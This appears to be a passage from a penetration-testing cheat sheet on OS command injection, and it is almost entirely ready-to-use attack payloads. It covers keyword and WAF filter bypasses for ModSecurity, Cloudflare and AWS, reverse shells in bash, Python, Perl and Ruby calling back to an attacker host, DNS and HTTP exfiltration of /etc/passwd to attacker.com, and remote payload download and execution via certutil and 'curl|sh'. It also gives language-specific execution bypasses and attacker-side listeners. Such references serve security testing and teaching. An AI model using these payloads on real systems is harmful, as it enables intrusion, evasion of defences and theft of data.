::collapsible

```bash [Keyword-Specific Bypass Payloads]
# ===== "cat" is blocked =====
tac /etc/passwd
nl /etc/passwd
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
sort /etc/passwd
rev /etc/passwd | rev
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
ca$@t /etc/passwd
/bin/c?t /etc/passwd
/???/c?t /etc/passwd
$(printf '\x63\x61\x74') /etc/passwd

# ===== "whoami" is blocked =====
id
/usr/bin/id
echo $USER
w'h'o'a'm'i
w\hoami
who$@ami
/bin/w?oami
$(printf '\x77\x68\x6f\x61\x6d\x69')
echo d2hvYW1p | base64 -d | bash

# ===== "ls" is blocked =====
dir
echo *
find . -maxdepth 1
printf '%s\n' *
l\s
l''s
/bin/l?
/bin/?s

# ===== "bash" is blocked =====
sh
/bin/sh
dash
/bin/dash
zsh
ksh
csh
tcsh
b'a's'h'
b\ash
${SHELL}
/???/b??h
echo d2hvYW1p | base64 -d | sh

# ===== "wget" or "curl" is blocked =====
# Use other download methods (see Network Commands section)
python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker.com/x','x')"
perl -MLWP::Simple -e 'getstore("http://attacker.com/x","x")'
php -r 'file_put_contents("x",file_get_contents("http://attacker.com/x"));'
lwp-download http://attacker.com/x
/dev/tcp method (see above)
w'g'et http://attacker.com/x
w\get http://attacker.com/x
c'u'rl http://attacker.com/x
c\url http://attacker.com/x

# ===== "nc" / "netcat" is blocked =====
ncat
socat
bash -i >& /dev/tcp/attacker/4444 0>&1
python3 -c 'import socket,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/sh")'
perl -e 'use Socket;$i="attacker";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")'
ruby -rsocket -e 'f=TCPSocket.open("attacker",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# ===== "eval" is blocked =====
source <(echo "whoami")
. <(echo "whoami")
bash -c "whoami"
sh -c "whoami"
echo "whoami" | bash
echo "whoami" | sh

# ===== "/" (slash) is blocked =====
# Use $HOME, $PWD, $SHELL, $PATH to get /
${HOME:0:1}etc${HOME:0:1}passwd
${PATH:0:1}etc${PATH:0:1}passwd
${SHELL:0:1}etc${SHELL:0:1}passwd
$(echo L2V0Yy9wYXNzd2Q= | base64 -d)    # /etc/passwd

# ===== "." (dot) is blocked =====
# Use source (same as .)
source script.sh
# Or use alternatives that don't need dots
cat /etc/passwd         # no dot needed
cat flag${HOME:0:1}txt  # construct .txt differently
```

::

### When All Alphanumeric Characters Are Blocked

This extreme scenario uses only special characters to construct commands (Bash-specific).

::collapsible

```bash [Non-Alphanumeric Bash Payloads]
# Using $0 (shell name) and string operations
# $0 typically = "bash" or "/bin/bash"

# The _ variable holds the last argument of the previous command
# After a command like /bin/cat, $_ = "/bin/cat"

# Using $(()) arithmetic for numbers
# $((0)) = 0, $((1)) = 1, etc.
# But we need letters...

# The ${!#} trick:
# ${#} = number of positional params = 0
# ${##} = length of "0" = 1
# Then use $(($((${##}))<<${##})) = 2, etc.

# In practice, construct from:
# $_  — last argument
# $0  — shell name
# $?  — exit code
# $$  — PID
# ${#} — param count
# ${parameter:offset:length} — substring extraction

# Example framework (conceptual):
# Get "/" from $0 if $0=/bin/bash: ${0:0:1}
# Get "b" from $0: ${0:5:1} (if $0=/bin/bash)
# Build up character by character

# This technique is extremely version-dependent
# See: https://github.com/pr0xy-t/Non-Alphanumeric-Bash
```

::

---

## WAF Bypass Techniques

### ModSecurity / OWASP CRS Bypass

```bash [ModSecurity CRS Bypass]
# CRS Rule 932100-932180: OS Command Injection

# Bypass via concatenation
a]a]a]a]a]a]whoami                     # Nested bracket confusion
;{whoami}                              # Brace syntax
${IFS}cat${IFS}/etc/passwd             # IFS instead of space
;cat${IFS}/etc${IFS}/passwd            # Multiple IFS

# Bypass via encoding
;%77%68%6f%61%6d%69                    # URL-encoded whoami
;$(echo${IFS}d2hvYW1p|base64${IFS}-d)  # Base64 with IFS

# Bypass via variable expansion
;c${not_exist}at /etc/passwd
;$'\143\141\164' /etc/passwd           # Octal
;$'\x63\x61\x74' /etc/passwd           # Hex

# Bypass via wildcard
;/???/??t /???/??????
;/b[i]n/ca[t] /e[t]c/pas[s]w[d]

# Bypass via comment injection
;whoami#
;whoami%0a%23
;cat${IFS}/etc/passwd%00
;cat${IFS}/etc/passwd${IFS}#

# Bypass via newline injection
input%0awhoami
input%0d%0awhoami

# Paranoia level-specific bypasses
# Level 1: Basic detection — most bypasses work
# Level 2: More patterns — need encoding
# Level 3: Strict — need multi-layer obfuscation
# Level 4: Paranoid — very difficult, may need logic bugs
```

### Cloudflare WAF Bypass

```bash [Cloudflare WAF Bypass]
# Cloudflare blocks common injection patterns

# Newline-based bypass
;%0awhoami
%0a/bin/cat%20/etc/passwd

# Tab-separated
;%09whoami
;%09cat%09/etc/passwd

# Obfuscated with quotes
;w'h'o'am'i
;c'a't /e't'c/p'a'ss'w'd

# Using backticks
;`whoami`
;`cat /etc/passwd`

# Dollar substitution
;$(whoami)
;$(cat${IFS}/etc/passwd)

# Hex encoding with $''
;$'\x77\x68\x6f\x61\x6d\x69'

# Base64 pipeline
;echo${IFS}d2hvYW1p|base64${IFS}-d|bash

# Wildcard paths
;/b?n/c?t /e?c/p????d
;/???/???/???l ??

# Chunked transfer encoding (HTTP level)
# Some WAFs don't reassemble chunked bodies
# Use chunked encoding to split the payload across chunks

# Unicode normalization bypass
# Cloudflare may normalize Unicode differently
;%EF%BC%B7%EF%BD%88%EF%BD%8F%EF%BD%81%EF%BD%8D%EF%BD%89
# Full-width Unicode characters for "Whoami"
```

### AWS WAF Bypass

```bash [AWS WAF Bypass]
# AWS WAF managed rules — command injection rule group

# Case manipulation (if filter is case-sensitive)
;WhOaMi
;WHOAMI
;Cat /ETC/PASSWD

# Encoding bypass
;%77hoami
;w%68oami

# Pipe with spaces
;|cat /etc/passwd

# Variable insertion
;wh${x}oami
;c${garbage}at /etc/passwd

# Using less common separators
%0awhoami
%0a%0dwhoami
%09whoami

# Header injection (X-Forwarded-For etc.)
# Some AWS WAF rules only check body, not headers

# Multipart form boundary tricks
# WAF may not parse multipart correctly
Content-Type: multipart/form-data; boundary=----
------
Content-Disposition: form-data; name="input"

;whoami
--------
```

### Generic WAF Bypass Strategies

::collapsible

```bash [Universal WAF Bypass Approaches]
# 1. Case Variation
;WhOaMi
;wHoAmI
;WHOAMI

# 2. Whitespace alternatives
;cat%09/etc/passwd          # Tab
;cat%0b/etc/passwd          # Vertical tab
;{cat,/etc/passwd}          # Brace expansion (no space)
;cat$IFS/etc/passwd         # IFS variable
;cat${IFS}/etc/passwd       # IFS with braces
;cat<>/etc/passwd           # Redirection

# 3. String concatenation
;c'a't /etc/passwd
;c"a"t /etc/passwd
;c\at /etc/passwd
;$'cat' /etc/passwd

# 4. Command substitution nesting
;$($(echo cat) /etc/passwd)
;`echo cat` /etc/passwd
;eval cat /etc/passwd
;bash<<<'cat /etc/passwd'

# 5. Character construction
;$(printf '\x63\x61\x74') /etc/passwd
;$(echo -e '\143\141\164') /etc/passwd
;$(echo Y2F0 | base64 -d) /etc/passwd
;$(echo 636174 | xxd -r -p) /etc/passwd
;$(rev<<<'tac') /etc/passwd

# 6. Environment variable abuse
;${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}etc${PATH:0:1}passwd

# 7. Wildcard substitution
;/???/c?t /???/p????d
;/b[i]n/c[a]t /e[t]c/p[a]sswd

# 8. Double encoding
;%2527%253B%2577hoami

# 9. Null byte injection
;whoami%00
;whoami%00.html

# 10. HTTP Parameter Pollution
input=;whoami&input=safe_value
# Server may process first or second value

# 11. Content-Type manipulation
# Send as JSON when form expected
Content-Type: application/json
{"input":";whoami"}

# 12. Chunked Transfer Encoding
# Split payload across HTTP chunks
Transfer-Encoding: chunked

# 13. Oversized headers/body
# Some WAFs have body size limits
# Pad with junk data before the payload
AAAA...AAAA;whoami
```

::

---

## Time-Based & Blind Command Injection

When output is not visible, use timing and out-of-band techniques to confirm injection.

### Time-Based Detection

```bash [Time-Based Payloads — Linux]
# sleep command
; sleep 5
| sleep 5
& sleep 5
&& sleep 5
|| sleep 5
$(sleep 5)
`sleep 5`

# sleep with obfuscation
; sl'e'ep 5
; s\leep 5
; $'\x73\x6c\x65\x65\x70' 5
; /bin/sl??p 5

# Ping-based timing (measurable delay)
; ping -c 5 127.0.0.1
| ping -c 5 127.0.0.1

# Python-based delay
; python3 -c "import time;time.sleep(5)"
; python -c "__import__('time').sleep(5)"

# Perl-based delay
; perl -e 'sleep(5)'

# Ruby-based delay
; ruby -e 'sleep(5)'

# Read-based delay (waits for input timeout)
; read -t 5 x
```

```bash [Time-Based Payloads — Windows]
:: timeout command
& timeout /t 5
&& timeout /t 5
| timeout /t 5

:: ping-based delay (each ping ~1 second)
& ping -n 5 127.0.0.1
&& ping -n 6 127.0.0.1 >nul

:: PowerShell delay
& powershell -c "Start-Sleep -Seconds 5"
& powershell Start-Sleep 5

:: choice command
& choice /t 5 /d y >nul
```

### Out-of-Band (OOB) Exfiltration

```bash [OOB Exfiltration — Linux]
# DNS exfiltration
; nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com
; host $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
; curl http://$(whoami).attacker.com

# DNS with encoded data
; nslookup $(cat /etc/hostname | base64).attacker.com
; dig $(id | tr ' ' '-').attacker.com

# HTTP exfiltration
; curl http://attacker.com/exfil?data=$(whoami)
; curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)
; wget http://attacker.com/exfil?data=$(id) -O /dev/null

# Using /dev/tcp (bash)
; echo $(whoami) > /dev/tcp/attacker.com/80
; bash -c 'echo $(id) > /dev/tcp/attacker.com/4444'

# ICMP exfiltration
; ping -c 1 -p $(xxd -p -l 16 /etc/hostname) attacker.com

# File-based exfiltration (write to web root)
; whoami > /var/www/html/output.txt
; cat /etc/passwd > /var/www/html/data.txt

# Interaction tools
; curl -X POST -d "$(cat /etc/passwd)" http://attacker.com/collect
; wget --post-data="$(id)" http://attacker.com/collect
```

```bash [OOB Exfiltration — Windows]
:: DNS exfiltration
& nslookup %USERNAME%.attacker.com
& powershell -c "Resolve-DnsName ($env:USERNAME+'.attacker.com')"

:: HTTP exfiltration
& powershell -c "Invoke-WebRequest ('http://attacker.com/exfil?d='+$env:USERNAME)"
& powershell -c "IWR http://attacker.com/exfil?d=$(whoami)"
& curl http://attacker.com/exfil?d=%USERNAME%

:: certutil for file download (also useful for exfil)
& certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe
```

### OOB Listener Setup

```bash [Attacker-Side Listeners]
# HTTP listener
python3 -m http.server 80
python3 -c "from http.server import *;HTTPServer(('0.0.0.0',80),SimpleHTTPRequestHandler).serve_forever()"
nc -lvnp 80

# DNS listener
# Use Burp Collaborator
# Or interactsh
interactsh-client

# Or custom DNS server
sudo python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 53))
while True:
    data, addr = s.recvfrom(1024)
    print(f'DNS query from {addr}: {data}')
"

# Netcat listener for reverse shell
nc -lvnp 4444
ncat -lvnp 4444
socat TCP-LISTEN:4444 STDOUT
```

---

## Length-Restricted Bypass

When input length is limited, use short payloads or staged execution.

### Ultra-Short Payloads

```bash [Short Payloads — Linux]
# 2-3 characters
id                    # 2 chars
ls                    # 2 chars
ps                    # 2 chars
w                     # 1 char (shows who's logged in)
df                    # 2 chars
env                   # 3 chars
pwd                   # 3 chars
who                   # 3 chars

# 4-6 characters
;id                   # 3 chars
|id                   # 3 chars
`id`                  # 4 chars
$(id)                 # 5 chars
;ls                   # 3 chars
;pwd                  # 4 chars
;env                  # 4 chars
```

### Staged Execution (Write & Execute)

```bash [Staged Execution for Length Limits]
# Stage 1: Write payload piece by piece to a file
# Each injection is short but builds up a script

# Write "#!/bin/bash" (use >> to append)
;echo '#!/' > /tmp/x
;echo 'bin/' >> /tmp/x
;echo 'bash' >> /tmp/x

# Write the actual command
;echo 'cat' >> /tmp/x
;echo ' /e' >> /tmp/x
;echo 'tc/' >> /tmp/x
;echo 'pas' >> /tmp/x
;echo 'swd' >> /tmp/x

# Execute the script
;sh /tmp/x
;bash /tmp/x
;. /tmp/x

# Even shorter staging using printf
;printf 'i' > /tmp/x
;printf 'd' >> /tmp/x
;sh /tmp/x

# Using wget with short URL
;wget t.co/x                    # Short URL to payload
;curl t.co/x|sh                 # Pipe to shell

# Alias trick (if persistent)
;alias x=whoami
;x
```

---

## Language-Specific Injection

### PHP Command Injection

```php [PHP Command Injection Bypass]
// When system(), exec(), shell_exec() are blocked

// Alternative PHP functions
passthru('whoami');
popen('whoami', 'r');
proc_open('whoami', ...);
pcntl_exec('/bin/whoami');
assert('system("whoami")');             // PHP < 7.2
preg_replace('/x/e', 'system("id")', 'x');  // PHP < 7.0

// Backtick execution
echo `whoami`;
echo `cat /etc/passwd`;

// Using variable functions
$f = 'system'; $f('whoami');
$f = 'sys'.'tem'; $f('whoami');
${'f'} = 'system'; ${'f'}('whoami');

// Using call_user_func
call_user_func('system', 'whoami');
call_user_func_array('system', ['whoami']);

// Using array_map
array_map('system', ['whoami']);
array_filter(['whoami'], 'system');

// Using create_function (deprecated but may exist)
$f = create_function('', 'system("whoami");'); $f();

// Obfuscated function names
$a='sys';$b='tem';$c=$a.$b;$c('whoami');
$x = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $x('whoami');
$x = "\x73\x79\x73\x74\x65\x6d"; $x('whoami');

// Using include/require for file reading
include('/etc/passwd');
include('php://filter/convert.base64-encode/resource=/etc/passwd');
readfile('/etc/passwd');
file_get_contents('/etc/passwd');
highlight_file('/etc/passwd');
show_source('/etc/passwd');

// Bypass disable_functions using LD_PRELOAD / FFI / imap_open
// See: https://github.com/TarlogicSecurity/Chankro
```

### Python Command Injection

```python [Python Command Injection Bypass]
# When os.system() is blocked

# Alternative execution functions
import subprocess
subprocess.call(['whoami'])
subprocess.Popen(['whoami'])
subprocess.check_output(['whoami'])
subprocess.run(['whoami'])

# Using os module
import os
os.system('whoami')
os.popen('whoami').read()
os.execl('/bin/sh', 'sh', '-c', 'whoami')

# Using eval/exec
eval("__import__('os').system('whoami')")
exec("__import__('os').system('whoami')")

# Using compile
code = compile("__import__('os').system('whoami')", '<string>', 'exec')
exec(code)

# Obfuscated imports
__import__('os').system('whoami')
__import__('\x6f\x73').system('whoami')
getattr(__import__('os'), 'system')('whoami')
getattr(__import__('os'), '\x73\x79\x73\x74\x65\x6d')('whoami')

# Using builtins
__builtins__.__import__('os').system('whoami')

# Using ctypes
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.system(b"whoami")

# Pickle deserialization for command execution
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('whoami',))
pickle.dumps(Exploit())

# Without importing os directly
eval('__import__("os").popen("whoami").read()')
(lambda: __import__('os').system('whoami'))()
```

### Node.js Command Injection

```javascript [Node.js Command Injection Bypass]
// When child_process.exec() is blocked

// Alternative execution methods
require('child_process').execSync('whoami').toString()
require('child_process').spawnSync('whoami').stdout.toString()
require('child_process').execFileSync('/bin/sh', ['-c', 'whoami']).toString()

// Using spawn
const { spawn } = require('child_process');
spawn('whoami').stdout.on('data', (data) => console.log(data.toString()));

// Obfuscated require
global.process.mainModule.require('child_process').execSync('whoami').toString()
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString()

// eval-based
eval("require('child_process').execSync('whoami').toString()")

// Function constructor
new Function("return require('child_process').execSync('whoami').toString()")()

// Template literal injection
`${require('child_process').execSync('whoami')}`

// String concatenation to avoid keyword detection
require('child_'+'process')['exe'+'cSync']('whoami').toString()
var m = 'child_process'; require(m).execSync('whoami').toString()

// Using fs for file reading when exec is blocked
require('fs').readFileSync('/etc/passwd', 'utf8')
```

### Ruby Command Injection

```ruby [Ruby Command Injection Bypass]
# Direct execution
system('whoami')
`whoami`
%x(whoami)
exec('whoami')

# Using IO
IO.popen('whoami').read
IO.popen('cat /etc/passwd').read

# Using Open3
require 'open3'
Open3.capture2('whoami')[0]

# Using Kernel
Kernel.system('whoami')
Kernel.exec('whoami')
Kernel.`('whoami')

# Using Process
Process.spawn('whoami')

# Using eval
eval("`whoami`")
eval("system('whoami')")

# Obfuscated
send(:system, 'whoami')
method(:system).call('whoami')
```

---

## Payload Quick Reference

### Detection Payloads

::collapsible

```bash [Universal Detection Payloads]
# Semicolon chain
;id
;whoami
;uname -a
;cat /etc/passwd

# Pipe
|id
|whoami

# AND chain
&&id
&&whoami

# OR chain
||id
||whoami

# Background
&id
&whoami

# Backtick
`id`
`whoami`

# Dollar substitution
$(id)
$(whoami)

# Newline
%0aid
%0awhoami
%0a%0did

# Time-based confirmation
;sleep 5
|sleep 5
$(sleep 5)
`sleep 5`
&& sleep 5
|| sleep 5
;ping -c 5 127.0.0.1
& ping -n 5 127.0.0.1

# DNS confirmation
;nslookup test.BURP-COLLABORATOR-ID
|nslookup test.BURP-COLLABORATOR-ID
$(nslookup test.BURP-COLLABORATOR-ID)
`nslookup test.BURP-COLLABORATOR-ID`

# HTTP confirmation
;curl http://BURP-COLLABORATOR-ID
|wget http://BURP-COLLABORATOR-ID
$(curl http://BURP-COLLABORATOR-ID)

# Windows specific
&whoami
&&whoami
|whoami
||whoami
&hostname
&ipconfig
&systeminfo
%0awhoami
& ping -n 5 127.0.0.1
& nslookup test.BURP-COLLABORATOR-ID
```

::

### Complete Bypass Cheat Sheet

| Technique | Payload Example |
| --- | --- |
| Quote insertion | `w'h'o'am'i` |
| Double quote | `w"h"o"am"i` |
| Backslash | `w\h\o\a\m\i` |
| Variable concat | `a=wh;b=oami;$a$b` |
| Empty variable | `w${x}ho${x}ami` |
| $IFS space | `cat${IFS}/etc/passwd` |
| Brace expansion | `{cat,/etc/passwd}` |
| Tab space | `cat%09/etc/passwd` |
| Wildcard | `/???/c?t /???/p????d` |
| Char range | `/bin/ca[t] /etc/passwd` |
| Hex encoding | `$'\x63\x61\x74'` |
| Octal encoding | `$'\143\141\164'` |
| Base64 | `echo Y2F0 \| base64 -d \| bash` |
| Printf | `$(printf '\x77\x68\x6f\x61\x6d\x69')` |
| Rev | `$(rev<<<'imaohw')` |
| URL encode | `%3Bwhoami` |
| Double URL encode | `%253Bwhoami` |
| Newline inject | `%0awhoami` |
| Full path | `/usr/bin/whoami` |
| Caret (Windows) | `w^h^o^a^m^i` |
| Env var substring | `${PATH:0:1}bin${PATH:0:1}cat` |

---

## Tools & Resources

### Primary Tools

::field-group
  ::field{name="Commix" type="string"}
  Automated command injection exploitation tool. Supports multiple techniques, encodings, and OS targets.
  `https://github.com/commixproject/commix`
  ::

  ::field{name="Burp Suite" type="string"}
  Web application security testing platform. Use Intruder with command injection wordlists for automated fuzzing.
  `https://portswigger.net/burp`
  ::

  ::field{name="PayloadsAllTheThings" type="string"}
  Comprehensive payload repository with extensive command injection bypass lists.
  `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection`
  ::

  ::field{name="SecLists" type="string"}
  Wordlists for fuzzing including command injection payloads.
  `https://github.com/danielmiessler/SecLists/tree/master/Fuzzing`
  ::

  ::field{name="Nuclei" type="string"}
  Template-based scanner with command injection detection templates.
  `nuclei -tags cmdi -u target.com`
  ::

  ::field{name="ffuf / wfuzz" type="string"}
  Fast web fuzzers for injecting command injection payloads into parameters.
  `https://github.com/ffuf/ffuf`
  ::

  ::field{name="Kadimus" type="string"}
  LFI/RFI scanner that can chain with command injection for shell access.
  `https://github.com/P0cL4bs/Kadimus`
  ::
::

### Wordlists

::field-group
  ::field{name="SecLists Command Injection" type="string"}
  `/usr/share/seclists/Fuzzing/command-injection/`
  ::

  ::field{name="FuzzDB OS Commands" type="string"}
  `https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/os-cmd-execution`
  ::

  ::field{name="IntruderPayloads" type="string"}
  `https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/command-injection.txt`
  ::

  ::field{name="Commix Payloads" type="string"}
  Built-in to commix — covers time-based, file-based, and results-based techniques.
  ::

  ::field{name="Custom Filter Bypass Lists" type="string"}
  `https://github.com/carlospolop/hacktricks/blob/master/linux-hardening/bypass-bash-restrictions/`
  ::
::

### References

::field-group
  ::field{name="OWASP Command Injection" type="string"}
  `https://owasp.org/www-community/attacks/Command_Injection`
  ::

  ::field{name="PortSwigger OS Command Injection" type="string"}
  `https://portswigger.net/web-security/os-command-injection`
  ::

  ::field{name="HackTricks Command Injection" type="string"}
  `https://book.hacktricks.wiki/en/pentesting-web/command-injection.html`
  ::

  ::field{name="HackTricks Bash Restrictions Bypass" type="string"}
  `https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/`
  ::

  ::field{name="CWE-78 OS Command Injection" type="string"}
  `https://cwe.mitre.org/data/definitions/78.html`
  ::

  ::field{name="GTFOBins" type="string"}
  Unix binaries that can be exploited for command execution, file reads, reverse shells.
  `https://gtfobins.github.io/`
  ::

  ::field{name="LOLBAS (Windows)" type="string"}
  Living Off The Land Binaries, Scripts, and Libraries for Windows.
  `https://lolbas-project.github.io/`
  ::

  ::field{name="Reverse Shell Generator" type="string"}
  `https://www.revshells.com/`
  ::
::